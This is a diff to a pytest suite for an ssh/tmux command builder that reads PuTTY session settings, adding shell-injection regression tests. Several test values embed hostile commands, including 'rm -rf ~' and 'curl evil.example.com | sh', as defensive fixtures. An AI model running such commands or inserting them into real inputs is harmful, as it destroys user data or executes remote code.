@@ -1,3 +1,4 @@
+import shlex
 import shutil
 import sys
 from pathlib import Path
@@ -9,11 +10,21 @@ import pytest
 from utils.display_util import generate_menu_items, make_display_pair
 from utils.putty_parse_util import parse_putty_reg
 from utils.recent_sessions_util import load_recent_sessions, update_recent_sessions
-from utils.ssh_command_util import build_ssh_command
+from utils.ssh_command_util import build_ssh_command, safe_name
 from utils.titlecase_util import smart_title, unquote_display
 
 REG_PATH = Path(__file__).parent / "data" / "sample.reg"
 PPK_FIXTURE = Path(__file__).parent / "data" / "test_key.ppk"
+
+
+def pane_cmd(argv):
+    """Extract the ssh command string from a tmux argv list."""
+    return next(a for a in argv if a.startswith("ssh"))
+
+
+def ssh_tokens(argv):
+    """Split the tmux pane command back into ssh argv tokens."""
+    return shlex.split(pane_cmd(argv))
 
 REG_HEADER = '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\'
 
@@ -198,58 +209,66 @@ class TestTitlecase:
 # ── SSH command building ─────────────────────────────────────────────────────
 
 class TestBuildSshCommand:
+    @pytest.fixture(autouse=True)
+    def _no_tmux(self, monkeypatch, tmp_path):
+        monkeypatch.delenv("TMUX", raising=False)
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+
     def test_missing_hostname(self):
         assert build_ssh_command("x", {"PortNumber": "22"}) == (None, None)
 
-    @pytest.fixture(autouse=True)
-    def _no_tmux(self, monkeypatch):
-        monkeypatch.delenv("TMUX", raising=False)
-        monkeypatch.setenv("PUTTY_LOG_DIR", "/tmp/opencode/putty-test-logs")
-
-    def test_basic_host(self):
-        cmd, temp_key = build_ssh_command("s", {"HostName": "h.example.com"})
+    def test_basic_host_argv(self):
+        argv, temp_key = build_ssh_command("s", {"HostName": "h.example.com"})
         assert temp_key is None
-        assert "ssh" in cmd and "h.example.com" in cmd
+        assert argv[0] == "tmux"
+        assert "h.example.com" in ssh_tokens(argv)
 
     def test_user_and_port(self):
-        cmd, _ = build_ssh_command("s", {
+        argv, _ = build_ssh_command("s", {
             "HostName": "h.example.com", "UserName": "u", "PortNumber": "2222",
         })
-        assert "u@h.example.com" in cmd
-        assert "-p 2222" in cmd
+        assert argv[0] == "tmux"
+        assert argv[1] == "new-session"
+        tokens = ssh_tokens(argv)
+        assert "u@h.example.com" in tokens
+        assert "-p" in tokens and "2222" in tokens
 
     def test_jump_proxy(self):
-        cmd, _ = build_ssh_command("s", {
+        argv, _ = build_ssh_command("s", {
             "HostName": "t.internal", "ProxyMethod": "6",
             "ProxyHost": "jump.example.com", "ProxyPort": "2222",
             "ProxyUsername": "ju",
         })
-        assert "-J ju@jump.example.com:2222" in cmd
+        tokens = ssh_tokens(argv)
+        assert tokens[tokens.index("-J") + 1] == "ju@jump.example.com:2222"
 
-    def test_remote_command_present(self):
-        cmd, _ = build_ssh_command("s", {
+    def test_remote_command_argv(self):
+        argv, _ = build_ssh_command("s", {
             "HostName": "c.example.com", "RemoteCommand": "htop",
         })
-        assert "htop" in cmd
+        tokens = ssh_tokens(argv)
+        assert "-t" in tokens
+        assert tokens[-1] == "htop"
 
     def test_no_hardcoded_user_paths(self):
-        cmd, _ = build_ssh_command("s", {"HostName": "h"})
-        assert "hiiam" not in cmd
-        assert "/mnt/c/Users" not in cmd
+        argv, _ = build_ssh_command("s", {"HostName": "h"})
+        joined = " ".join(argv)
+        assert "/mnt/c/Users" not in joined
+        assert "OneDrive" not in joined
 
     def test_log_dir_from_env(self, monkeypatch, tmp_path):
         logdir = tmp_path / "mylogs"
         monkeypatch.setenv("PUTTY_LOG_DIR", str(logdir))
-        cmd, _ = build_ssh_command("s", {"HostName": "h.example.com"})
-        assert str(logdir) in cmd
+        argv, _ = build_ssh_command("s", {"HostName": "h.example.com"})
+        assert str(logdir) in " ".join(argv)
 
     def test_log_dir_defaults_to_reg_parent(self, tmp_path, monkeypatch):
         monkeypatch.delenv("PUTTY_LOG_DIR", raising=False)
         reg = tmp_path / "settings" / "putty.reg"
         reg.parent.mkdir(parents=True)
         reg.touch()
-        cmd, _ = build_ssh_command("s", {"HostName": "h"}, reg_path=reg)
-        assert f"{tmp_path}/settings" in cmd
+        argv, _ = build_ssh_command("s", {"HostName": "h"}, reg_path=reg)
+        assert f"{tmp_path}/settings" in " ".join(argv)
 
     def test_ppk_resolved_relative_to_reg_path(self, tmp_path, monkeypatch, capsys):
         monkeypatch.setenv("PUTTY_LOG_DIR", "/tmp/opencode/putty-test-logs")
@@ -258,7 +277,7 @@ class TestBuildSshCommand:
         keys_dir = tmp_path / "keys"
         keys_dir.mkdir()
         shutil.copy(PPK_FIXTURE, keys_dir / "id.ppk")
-        cmd, temp_key = build_ssh_command(
+        argv, temp_key = build_ssh_command(
             "s",
             {"HostName": "h", "PublicKeyFile": "keys/id.ppk"},
             reg_path=reg,
@@ -267,4 +286,59 @@ class TestBuildSshCommand:
         assert str(keys_dir / "id.ppk") in out
         assert temp_key is not None
         Path(temp_key).unlink(missing_ok=True)
-        assert "-i" in cmd
+        assert "-i" in ssh_tokens(argv)
+
+    # ── Injection resistance (fix 2 regression tests) ────────────────────────
+
+    def test_evil_session_name_quoted(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+        evil = "x'; rm -rf ~; echo '"
+        argv, _ = build_ssh_command(evil, {"HostName": "h"})
+        # Window name must be the sanitized version (no shell metachars)
+        assert argv[argv.index("-n") + 1] == safe_name(evil)
+        # ...which contains no quotes/semicolons that could escape tmux parsing
+        assert "'" not in argv[argv.index("-n") + 1]
+        # ...and no raw injection text survives anywhere in the argv
+        assert "rm -rf" not in " ".join(argv)
+
+    def test_evil_hostname_never_executes(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+        evil_host = "h'; touch /tmp/pwned-putty; echo '"
+        argv, _ = build_ssh_command("s", {"HostName": evil_host})
+        # evil host must be one shlex-quoted token inside the pane command
+        assert shlex.quote(evil_host) in pane_cmd(argv)
+        # splitting the pane cmd back yields the original value
+        assert evil_host in ssh_tokens(argv)
+
+    def test_evil_remote_command_is_safe_token(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+        evil = "x'; curl evil.example.com | sh; echo '"
+        argv, _ = build_ssh_command("s", {
+            "HostName": "h", "RemoteCommand": evil,
+        })
+        assert evil in ssh_tokens(argv)
+
+    def test_tmux_window_vs_session(self, monkeypatch, tmp_path):
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+        monkeypatch.setenv("TMUX", "/tmp/tmux-0/default,0,0")
+        argv, _ = build_ssh_command("s", {"HostName": "h"})
+        assert argv[1] == "new-window"
+        monkeypatch.delenv("TMUX")
+        argv, _ = build_ssh_command("s", {"HostName": "h"})
+        assert argv[1] == "new-session"
+
+    def test_pane_cmd_roundtrips(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
+        argv, _ = build_ssh_command("s", {
+            "HostName": "h.example.com", "UserName": "ops",
+            "PortNumber": "2222",
+        })
+        tokens = ssh_tokens(argv)
+        assert tokens[0] == "ssh"
+        assert "ops@h.example.com" in tokens
+        assert "-p" in tokens and "2222" in tokens
+
+    def test_safe_name_sanitizes(self):
+        assert safe_name("a/b\\c:d*e?f") == "a_b_c_d_e_f"
+        assert safe_name("") == "session"
+        assert safe_name("normal-session_1.0") == "normal-session_1.0"
